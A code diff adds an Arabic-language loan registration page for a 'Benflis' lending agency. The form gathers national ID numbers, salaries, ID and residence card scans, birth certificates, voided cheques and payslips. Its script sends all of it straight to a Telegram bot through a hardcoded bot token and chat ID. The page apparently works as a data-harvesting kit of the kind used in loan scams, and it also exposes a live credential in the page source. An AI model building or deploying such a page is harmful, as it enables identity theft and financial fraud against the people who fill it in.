@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>وكالة بن فليس للقروض المالية | استمارة التسجيل</title>
+<style>
+  :root { --blue:#0a47a9; --blue-dark:#06357f; --bg:#f4f7fc; --border:#cfd9ec; }
+  * { box-sizing:border-box; }
+  body { margin:0; font-family:"Segoe UI",Tahoma,Arial,sans-serif; background:var(--bg); color:#1b2438; }
+  header { background:#fff; text-align:center; padding:24px 16px 16px; border-bottom:4px solid var(--blue); }
+  header img { max-width:180px; height:auto; display:none; }
+  .logo-text { font-family:Georgia,"Times New Roman",serif; font-weight:bold; color:var(--blue); font-size:44px; line-height:1; direction:ltr; }
+  .logo-ar { color:var(--blue); font-size:20px; font-weight:bold; margin-bottom:4px; }
+  .title { color:var(--blue); font-size:22px; font-weight:bold; margin-top:10px; }
+  .phone { color:var(--blue); font-weight:bold; font-size:20px; margin-top:8px; direction:ltr; }
+  main { max-width:640px; margin:20px auto; padding:0 14px 40px; }
+  .card { background:#fff; border-radius:14px; padding:22px; box-shadow:0 2px 12px rgba(10,71,169,.1); }
+  h2 { color:var(--blue); margin-top:0; }
+  .note { background:#eaf1ff; border-right:4px solid var(--blue); padding:12px; border-radius:8px; font-size:14px; margin-bottom:18px; }
+  label { display:block; font-weight:600; margin:14px 0 6px; }
+  label span { color:#c0392b; }
+  input[type=text], input[type=tel], input[type=number], input[type=date] { width:100%; padding:11px; border:1px solid var(--border); border-radius:8px; font-size:16px; font-family:inherit; }
+  input:focus { outline:2px solid var(--blue); }
+  fieldset { border:1px solid var(--border); border-radius:10px; margin-top:20px; }
+  legend { color:var(--blue); font-weight:bold; padding:0 8px; }
+  .file { border:2px dashed var(--border); border-radius:10px; padding:12px; text-align:center; font-size:14px; color:#555; }
+  .file input { width:100%; margin-top:6px; }
+  button { width:100%; margin-top:24px; padding:14px; font-size:18px; font-weight:bold; color:#fff; background:var(--blue); border:0; border-radius:10px; cursor:pointer; }
+  button:hover { background:var(--blue-dark); }
+  button:disabled { opacity:.6; cursor:wait; }
+  #msg { margin-top:14px; text-align:center; font-weight:bold; }
+  footer { text-align:center; color:#667; font-size:13px; padding-bottom:24px; }
+</style>
+</head>
+<body>
+
+<header>
+  <!-- ضع ملف الشعار باسم logo.png بجانب هذا الملف لإظهاره -->
+  <img id="logo" src="logo.png" alt="شعار وكالة بن فليس"
+       onload="this.style.display='inline-block';document.getElementById('fallback').style.display='none'">
+  <div id="fallback">
+    <div class="logo-text">B</div>
+    <div class="logo-ar">وكالة</div>
+    <div class="logo-text" style="font-size:34px">Benflis</div>
+  </div>
+  <div class="title">وكالة بن فليس للقروض المالية</div>
+  <div class="phone">📞 0563685489</div>
+</header>
+
+<main>
+<div class="card">
+  <h2>استمارة التسجيل</h2>
+  <div class="note">📞 <b>ملاحظة مهمة:</b> بعد دراسة ملفك، سيتصل بك أحد موظفينا لإكمال الإجراءات.</div>
+  <p style="font-size:13px;color:#667">الحقول المعلّمة بـ <span style="color:#c0392b">*</span> إجبارية</p>
+
+  <form id="form">
+    <label>الاسم <span>*</span></label>
+    <input type="text" name="first_name" required>
+
+    <label>اللقب <span>*</span></label>
+    <input type="text" name="last_name" required>
+
+    <label>تاريخ الميلاد <span>*</span></label>
+    <input type="date" name="birth_date" required>
+
+    <label>رقم التعريف الوطني <span>*</span></label>
+    <input type="text" name="nin" inputmode="numeric" pattern="[0-9]{18}" maxlength="18" title="18 رقماً" required>
+
+    <label>رقم الهاتف <span>*</span></label>
+    <input type="tel" name="phone" pattern="0[5-7][0-9]{8}" title="مثال: 0563685489" required>
+
+    <label>رقم الهاتف 2</label>
+    <input type="tel" name="phone2" pattern="0[5-7][0-9]{8}" title="مثال: 0563685489">
+
+    <label>رقم الواتساب <span>*</span></label>
+    <input type="tel" name="whatsapp" pattern="0[5-7][0-9]{8}" title="مثال: 0563685489" required>
+
+    <label>الراتب الشهري (دج) <span>*</span></label>
+    <input type="number" name="salary" min="0" inputmode="numeric" required>
+
+    <fieldset>
+      <legend>الوثائق المطلوبة</legend>
+
+      <label>شهادة عمل أو شهادة تقاعد أو رقم الضمان الاجتماعي أو السجل التجاري</label>
+      <div class="file">📎 صورة أو PDF<input type="file" name="proof_of_income" accept="image/*,.pdf"></div>
+
+      <label>بطاقة التعريف الوطنية</label>
+      <div class="file">📎 صورة أو PDF<input type="file" name="national_id" accept="image/*,.pdf"></div>
+
+      <label>بطاقة إقامة</label>
+      <div class="file">📎 صورة أو PDF<input type="file" name="residence_card" accept="image/*,.pdf"></div>
+
+      <label>شهادة ميلاد</label>
+      <div class="file">📎 صورة أو PDF<input type="file" name="birth_certificate" accept="image/*,.pdf"></div>
+
+      <label>صك بريدي أو بنكي مشطوب</label>
+      <div class="file">📎 صورة أو PDF<input type="file" name="voided_cheque" accept="image/*,.pdf"></div>
+
+      <label>كشف الراتب للثلاثة أشهر الأخيرة</label>
+      <div class="file">📎 صورة أو PDF<input type="file" name="payslips" accept="image/*,.pdf" multiple></div>
+    </fieldset>
+
+    <button type="submit" id="btn">إرسال التسجيل</button>
+    <div id="msg"></div>
+  </form>
+</div>
+</main>
+
+<footer>© وكالة بن فليس للقروض المالية — 0563685489</footer>
+
+<script>
+  const BOT_TOKEN = "8985488607:AAHjzb8pZLX9Tk1_5AmAq6k7wdcuzBL1LG4";
+  const CHAT_ID = "8362521549";
+  const API = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
+  const MAX_FILE = 10 * 1024 * 1024; // 10 ميغابايت لكل ملف
+
+  const FIELDS = [
+    ["first_name", "الاسم"], ["last_name", "اللقب"], ["birth_date", "تاريخ الميلاد"],
+    ["nin", "رقم التعريف الوطني"], ["phone", "رقم الهاتف"], ["phone2", "رقم الهاتف 2"],
+    ["whatsapp", "رقم الواتساب"], ["salary", "الراتب الشهري (دج)"]
+  ];
+  const DOCS = [
+    ["proof_of_income", "شهادة عمل / تقاعد / ضمان اجتماعي / سجل تجاري"],
+    ["national_id", "بطاقة التعريف الوطنية"],
+    ["residence_card", "بطاقة إقامة"],
+    ["birth_certificate", "شهادة ميلاد"],
+    ["voided_cheque", "صك بريدي أو بنكي مشطوب"],
+    ["payslips", "كشف الراتب (3 أشهر)"]
+  ];
+
+  const esc = (s) => String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+
+  async function call(method, body) {
+    const res = await fetch(API + method, body instanceof FormData
+      ? { method: "POST", body }
+      : { method: "POST", body: JSON.stringify(body), headers: { "Content-Type": "application/json" } });
+    const data = await res.json();
+    if (!data.ok) throw new Error(data.description || "telegram error");
+  }
+
+  document.getElementById("form").addEventListener("submit", async (e) => {
+    e.preventDefault();
+    const form = e.target, msg = document.getElementById("msg"), btn = document.getElementById("btn");
+    const fd = new FormData(form);
+
+    // التحقق من أحجام الملفات
+    for (const [key] of DOCS) {
+      for (const f of fd.getAll(key)) {
+        if (f instanceof File && f.size > MAX_FILE) {
+          msg.style.color = "#c0392b";
+          msg.textContent = "❌ حجم الملف «" + f.name + "» أكبر من 10 ميغابايت.";
+          return;
+        }
+      }
+    }
+
+    btn.disabled = true;
+    msg.style.color = "#333";
+    msg.textContent = "جاري الإرسال... لا تغلق الصفحة";
+
+    try {
+      let text = "📥 <b>تسجيل جديد — وكالة بن فليس</b>\n\n";
+      for (const [key, label] of FIELDS) {
+        const v = (fd.get(key) || "").toString().trim();
+        text += "<b>" + label + ":</b> " + (v ? esc(v) : "—") + "\n";
+      }
+      await call("sendMessage", { chat_id: CHAT_ID, text, parse_mode: "HTML" });
+
+      const who = ((fd.get("first_name") || "") + " " + (fd.get("last_name") || "")).trim();
+      for (const [key, label] of DOCS) {
+        for (const f of fd.getAll(key)) {
+          if (!(f instanceof File) || f.size === 0) continue;
+          const up = new FormData();
+          up.append("chat_id", CHAT_ID);
+          up.append("caption", label + "\n" + who);
+          up.append("document", f, f.name);
+          await call("sendDocument", up);
+        }
+      }
+
+      msg.style.color = "green";
+      msg.textContent = "✅ تم إرسال تسجيلك بنجاح. سنتصل بك قريباً.";
+      form.reset();
+    } catch (err) {
+      msg.style.color = "#c0392b";
+      msg.textContent = "❌ حدث خطأ أثناء الإرسال، حاول مرة أخرى أو اتصل بنا على 0563685489.";
+    } finally {
+      btn.disabled = false;
+    }
+  });
+</script>
+</body>
+</html>
